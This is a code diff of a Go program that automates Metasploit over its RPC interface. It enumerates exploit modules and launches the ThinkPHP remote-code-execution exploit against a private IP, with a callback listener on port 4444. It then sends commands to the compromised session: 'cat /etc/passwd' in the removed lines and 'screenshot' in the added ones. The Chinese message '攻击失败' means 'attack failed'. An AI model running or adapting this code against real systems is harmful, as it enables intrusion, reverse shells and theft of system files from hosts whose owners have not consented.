@@ -22,7 +22,19 @@ func main() {
 	//}
 
 	//version, err := client.Core.Version()
-	//exploits, err := client.Module.Exploits()
+	exploits, err := client.Module.Exploits()
+	for i, exploit := range exploits {
+		//fmt.Println(exploit)
+		if len(exploit) > 0 {
+			moduleInfo, err := client.Module.Info(gomsf.ExploitType, exploit)
+			if err != nil {
+				fmt.Println(err)
+				continue
+			}
+			fmt.Println(i, exploit, moduleInfo.String())
+			time.Sleep(time.Millisecond * 20)
+		}
+	}
 	//architectures, err := client.Module.Architectures()
 	//platforms, err := client.Module.Platforms()
 	//payloads, err := client.Module.Payloads()
@@ -51,38 +63,38 @@ func main() {
 	//detail := exploit.OptionsDetail()
 	//fmt.Println(exploit.Get("RHOSTS"))
 	/*
-		res, err := client.Module.Execute(gomsf.ExploitType, "unix/webapp/thinkphp_rce", map[string]interface{}{
-			"RHOST":   "192.168.100.149",
-			"RPORT":   "8081",
-			"SRVHOST": "0.0.0.0",
-			"SRVPORT": "8080",
-			"LHOST":   "192.168.110.33",
-			"LPORT":   "4444",
-		})
-		fmt.Println(res, err)
-		if res.JobID > 0 && len(res.UUID) > 0 {
-			jobId := strconv.Itoa(int(res.JobID))
-			jobRes, _ := client.Jobs.Info(jobId)
-			fmt.Println(res.JobID, res.UUID)
-			fmt.Println("jobRes", jobRes)
-		} else {
-			fmt.Println("攻击失败")
-			return
-		}
-		//
+			res, err := client.Module.Execute(gomsf.ExploitType, "unix/webapp/thinkphp_rce", map[string]interface{}{
+				"RHOST":   "192.168.100.149",
+				"RPORT":   "8081",
+				"SRVHOST": "0.0.0.0",
+				"SRVPORT": "8080",
+				"LHOST":   "192.168.110.33",
+				"LPORT":   "4444",
+			})
+			fmt.Println(res, err)
+			if res.JobID > 0 && len(res.UUID) > 0 {
+				jobId := strconv.Itoa(int(res.JobID))
+				jobRes, _ := client.Jobs.Info(jobId)
+				fmt.Println(res.JobID, res.UUID)
+				fmt.Println("jobRes", jobRes)
+			} else {
+				fmt.Println("攻击失败")
+				return
+			}
+			//
 
+
+		//list, _ := client.Session.List()
+		//fmt.Println(list)
+		//return
+
+		err = client.Session.Write(7, "screenshot")
+		fmt.Println(err)
+		time.Sleep(time.Second * 1)
+		s, err := client.Session.Read(7)
+		fmt.Println(s)
+		fmt.Println(err)
 	*/
-	//list, _ := client.Session.List()
-	//fmt.Println(list)
-	//return
-
-	err = client.Session.Write(7, "cat /etc/passwd")
-	fmt.Println(err)
-	time.Sleep(time.Second * 2)
-	s, err := client.Session.Read(7)
-	fmt.Println(s)
-	fmt.Println(err)
-
 	//fmt.Println(client.Session.Stop(5))
 	//fmt.Println(client.Session.Stop(6))
 	//list, _ := client.Session.List()
